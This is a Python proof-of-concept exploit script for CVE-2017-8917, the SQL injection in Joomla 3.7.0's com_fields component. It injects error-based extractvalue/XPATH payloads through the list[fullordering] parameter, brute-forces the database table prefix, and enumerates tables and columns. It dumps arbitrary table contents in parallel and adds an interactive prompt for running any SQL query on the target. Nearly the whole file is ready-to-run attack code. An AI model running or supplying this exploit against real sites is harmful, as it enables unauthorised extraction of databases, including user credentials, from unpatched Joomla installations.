#!/usr/bin/env python
from binascii import hexlify
from bs4 import BeautifulSoup
from tqdm import tqdm

import concurrent.futures 
import requests
import re
import sys
import os
import json
import string
import argparse
from pprint import pprint


class SQLInjection:
    def __init__(self, url, out_dir='./'):
        # Joomla gets upset if you do //path.php for some reason
        self.url = url if url[-1] != '/' else url[:-1]

        self.out_dir = out_dir

        self.session = requests.Session()
        self.csrf_token = self.get_csrf()
        self.table_prefix = self.JOOMLA_leak_table_prefix()

    def get_csrf(self):
        r = self.session.get(self.url).text
        return re.findall('name="([0-9a-fA-F]{32})" value="1"', r, re.M)[0]

    def injection(self, inj, verbose=False):
        if verbose:
            print(f"Injection: [{inj}]")

        # HTTP GET parameters for Joomla 3.7.0 SQL Injection attack
        params = {
            "option": "com_fields",
            "view": "fields",
            "layout": "modal",
            "list[fullordering]": inj,
            self.csrf_token: '1'
        }
        r = self.session.get(self.url + "/index.php?option=com_fields&view=fields&layout=modal", params=params)
        soup = BeautifulSoup(r.text, features="html.parser")
        result = soup.find("div", {"class": "well"}).find("blockquote")
        if result:
            return result.text
        return False

    # http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html
    # This exploit takes advantage of the following function in SQL
    #   extractvalue(xml-type-instance, 'xpath-expression') 
    # 
    # This function produces verbose output of the error.
    # You are able to pass in a string, which it outputs. 
    # If this string is controlled, you can use this as a read primitive
    # Passing in data such as "select database()" will return the database.
    # 
    # This exploit combines the ORDER BY sqli in Joomla 3.7.0 with the XPATH error.
    # This in turn allows you to leak data about the underlying database.
    # You must keep in mind that you can only leak one line at a time.  
    # You can use LIMIT 0,1 to enumerate over the table
    def _XPATH_order_by_error_based_injection(self, inj):
        query = f"1,extractvalue(0x0a,concat(0x0a,({inj})));--"

        injection_response = self.injection(query)
        if not injection_response:
            return False

        if "returns more than 1 row" in injection_response:
            return "[!] ERROR(_XPATH_order_by_error_based_injection): Subquery must return 1 row"
        response = re.findall(
            r"XPATH syntax error:.*'(.*)'",
            injection_response.replace('\n', ' '),
            re.M
        )
        
        # Application specific. Returns new line on XPATH error
        if response:
            return response[0].strip()
        return f"[!] ERROR(_XPATH_order_by_error_based_injection): Check query syntax [{injection_response}]"

    def XPATH_order_by_error_based_injection(self, inj, blocksize=16):
        # The output length is restricted to 32 characters
        # So leak the output in blocks

        re_match = re.match(r'select\s([^\s]*)\sfrom\s(.*)', inj)
        if not re_match:
            return self._XPATH_order_by_error_based_injection(inj)

        col = re_match.group(1)
        rest = re_match.group(2)
        if "count" in col:
            return self._XPATH_order_by_error_based_injection(inj)

        query = f"select length({col}) from {rest}"
        response_length = int(self._XPATH_order_by_error_based_injection(query))

        response = ""
        for i in range(0, (response_length//blocksize) + 1):
            query = f"select substring({col}, {(i*blocksize) + 1}, {blocksize}) from {rest}"
            response += self._XPATH_order_by_error_based_injection(query)
        
        return response
     
    # You can gain the number by doing a COUNT(field_name)
    # i.e. select count(table_name) from information_schema.tables where table_schema=database()
    def XPATH_leak_all(self, inj, number, verbose=False, error_verbose=False):
        with tqdm(total=number) as pbar:
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [
                    executor.submit(self.XPATH_order_by_error_based_injection, inj + f" limit {i},1")
                    for i in range(number)
                ]
                responses = []
                for future in concurrent.futures.as_completed(futures):
                    responses.append(future.result())
                    pbar.update(1)

        # If verbose selected, return error as well
        if error_verbose: 
            return responses,resp
        return responses

    def JOOMLA_leak_table_prefix(self, verbose=True):
        if verbose:
            print("[+] Bruteforcing the database prefix")

        if os.path.exists(f"{self.out_dir}/db_prefix"):
            print("[!] Previously bruteforced prefix found, reading")
            with open(f"{self.out_dir}/db_prefix") as f:
                return f.read().strip()

        # We know a PREFIX_users table exists
        known = list("_users")
        guess = []

        # Effecient brute-force
        # Brute-force each character until you find it 
        # If the whole word can be used without '%', then you found whole word
        while True:
            found = False
            for c in string.ascii_letters+string.digits:
                table_name = '%' + c + ''.join(guess) + ''.join(known)
                table_name = hexlify(table_name.encode('utf-8')).decode('utf-8')

                query = f"select table_name from information_schema.tables where table_schema=database() and table_name like 0x{table_name}"
                resp = self._XPATH_order_by_error_based_injection(query)
                # Response means that no error
                # No error means that sql statement executed correctly
                if resp:
                    guess.insert(0, c)
                    found = True
                    break
            if verbose:
                print(f"[*] Guess so far: {''.join(guess) + ''.join(known)}")
            if not found:
                break

        if verbose:
            print(f"[+] Found database prefix: {''.join(guess)}")

        with open(f"{self.out_dir}/db_prefix", 'w') as f:
            f.write(''.join(guess))

        return ''.join(guess)

    def leak_db(self):
        return self.XPATH_order_by_error_based_injection("select database()")

    def leak_tables(self, current_db=True, number_override=None, verbose=False):
        # Get the sql injection query ready
        inj = "select table_name from information_schema.tables"
        if current_db:
            inj += " where table_schema=database()"

        # If you want to leak a specific number of tables
        try:
            if not number_override:
                # Get the number of tables to leak
                num = int(
                    self.XPATH_order_by_error_based_injection(
                        inj.replace("table_name", "count(table_name)")
                    )
                )
            else:
                num = int(number_override)
        except Exception as e:
            return f"[!] ERROR(leak_tables) : Something went wrong with fetching number of tables [{e}]"

        # Check if locally cached tables exists
        if not os.path.exists(f"{self.out_dir}/tables"):
            # Leak tables and replace the prefix with leaked prefix
            print("[+] Dumping tables ... ")
            tables = [
                i.replace('#_', self.table_prefix)
                for i in self.XPATH_leak_all(inj, num, verbose=verbose)
            ]
            with open(f"{self.out_dir}/tables", "w") as f:
                f.write('\n'.join(tables))
        else:
            with open(f"{self.out_dir}/tables") as f:
                tables = f.read().splitlines()

        if verbose:
            print(f"[*] Found {len(tables)} tables in current database")
        return tables

    def leak_all_tables_column_names(self, verbose=False):
        # Leak table names
        tables = self.leak_tables()

        # Check if file exists already otherwise generate the file
        if not os.path.exists(f"{self.out_dir}/column_names"):
            # Get number of columns per table
            print("[********** LEAKING ALL TABLES' COLUMN NAMES, THIS COULD TAKE A WHILE ***********]")
            with tqdm(total=len(tables)) as pbar:
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                    futures = {executor.submit(self.get_table_column_names, t): t for t in tables}

                    column_names = {}
                    for future in concurrent.futures.as_completed(futures):
                        t = futures[future]
                        column_names[t] = future.result()
                        pbar.update(1)

                    if verbose:
                        print(column_names)

                    with open(f"{self.out_dir}/column_names", 'w') as f:
                        f.write(json.dumps(column_names))
        else:
            with open(f"{self.out_dir}/column_names") as f:
                print(json.loads(f.read()))

    def table_column_count(self, table_name, current_db=False):
        table_name = '0x'+hexlify(table_name.encode("utf-8")).decode("utf-8")
        inj = f"select count(column_name) from information_schema.columns where table_name like {table_name}"
        if current_db:
            inj += " and table_schema=database()"
        inj += " limit 0,1"
        resp = self.XPATH_order_by_error_based_injection(inj)
        return int(resp)

    def get_table_column_names(self, table_name, num, current_db=False, verbose=False):
        table_name = '0x'+hexlify(table_name.encode("utf-8")).decode("utf-8")
        inj = f"select column_name from information_schema.columns where table_name like {table_name}"
        if current_db:
            inj += " and table_schema=database()"
        return self.XPATH_leak_all(inj, num, verbose)

    def get_table_column_names(self, name, current_db=False, verbose=False):
        # Convert table name, create SQL injection query
        table_name = '0x'+hexlify(name.encode("utf-8")).decode("utf-8")
        inj = f"select column_name from information_schema.columns where table_name like {table_name}"
        if current_db:
            inj += " and table_schema=database()"

        # Get how many columns you are looking for
        count = int(
            self.XPATH_order_by_error_based_injection(
                inj.replace("column_name", "count(column_name)")
            )
        )

        # Empty table
        if count == 0:
            return {"size":count, "columns":[]}

        print(f"[+] Retrieving column names for table {name}")
        col_names = self.XPATH_leak_all(inj, count, verbose)

        return {"size":count, "columns":col_names}

    def dump_table_values(self, columns, table_name, verbose=False):
        if "ALL" in columns:
            columns = self.get_table_column_names(table_name)["columns"]

        col_compression = ',0x7c,'.join(columns)
        query = f"select concat({col_compression}) from {table_name}"
        count = int(self.XPATH_order_by_error_based_injection(
            query.replace(f"concat({col_compression})", f"count(concat({col_compression}))")
        ))

        if verbose:
            print(f"[+] Dumping columns: {columns} from table: {table_name}")
        results = self.XPATH_leak_all(query, count, verbose)
        return [
                list(zip(columns,i.split("|"))) for i in results
        ]


# ------------------------------------------
def main(args):
    # Leak database type
    exploit = SQLInjection(args.url, args.outdir)
    if args.database:
        print(f"[+] Database : {exploit.leak_db()}")

    if args.tables:
        print(f"[+] Tables:")
        pprint(exploit.leak_tables(current_db=args.current_db))
    
    if args.secret_prefix:
        print(f"[+] Secret prefix: {exploit.table_prefix}")

    if args.table:
        if args.columns:
            print(f"[+] Results for columns: {args.columns} from table: {args.table}:")
            pprint(exploit.dump_table_values(args.columns, args.table))
        else:
            print(f"[+] Table {args.table} columns:")
            pprint(exploit.get_table_column_names(args.table))

def free_play(url): 
    exploit = SQLInjection(url)
    while True:
        print(exploit._XPATH_order_by_error_based_injection(input("sqli> ")))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Sai's PoC exploit for CVE-2017-8917, Joomla 3.7.0")
    parser.add_argument('url', help="Base url to exploit")
    parser.add_argument('-f', '--free_play', action="store_true", help="Execute custom SQL queries")
    parser.add_argument('-p', '--secret_prefix', action="store_true", help="Get secret prefix")
    parser.add_argument('-d', '--database', action="store_true", help="Extract database name")
    parser.add_argument('--table', help="Extract with context to table")
    parser.add_argument('--columns', nargs="+", help="Dump columns from table. 'ALL' dumps every column")
    parser.add_argument('--tables', action="store_true", help="Extract table columns")
    parser.add_argument('-o', '--outdir', default='./', help="Specify directory to write output to")
    parser.add_argument('--current_db', action="store_true", help="Extract anything in context with current database")
    args = parser.parse_args()

    if args.free_play:
        free_play(args.url)
    else:
        main(args)
    
